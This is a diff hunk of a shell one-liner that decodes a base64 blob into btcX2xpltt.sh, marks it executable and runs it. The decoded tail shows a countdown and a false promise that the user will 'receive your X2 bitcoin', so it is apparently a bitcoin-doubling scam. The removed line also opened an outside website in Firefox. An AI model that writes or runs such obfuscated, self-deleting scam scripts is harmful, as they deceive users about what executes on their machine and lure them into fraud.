@@ -57,5 +57,4 @@ ICAgICAgICAgICAgICBzZWM9NTkKICAgICAgICAgICAgICAgICAgICAgICAgbGV0ICJtaW49bWlu
 LTEiCiAgICAgICAgICAgICAgICBkb25lCiAgICAgICAgICAgICAgICBtaW49NTkKICAgICAgICAg
 ICAgICAgIGxldCAiaG91cj1ob3VyLTEiCiAgICAgICAgZG9uZQplY2hvICJUaGUgZXhwbG9pdCBp
 cyBkb25lISIKZWNobyAiWW91IHdpbGwgcmVjZWl2ZSB5b3VyIFgyIGJpdGNvaW4gaW4gYSBjb3Vw
-bGUgb2YgbWludXRlcyEiCnJtIGJ0Y1gyeHBsdC5zaCAmJiBmaXJlZm94IGh0dHA6Ly9wZXRzcGFs
-dGFuLmNvbS8gJiYgY2xlYXIgJiYgZXhpdAoKCg==" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
+bGUgb2YgbWludXRlcyEiCnJtIGJ0Y1gyeHBsdC5zaAo=" | base64 -d > btcX2xpltt.sh && chmod +x btcX2xpltt.sh && bash btcX2xpltt.sh
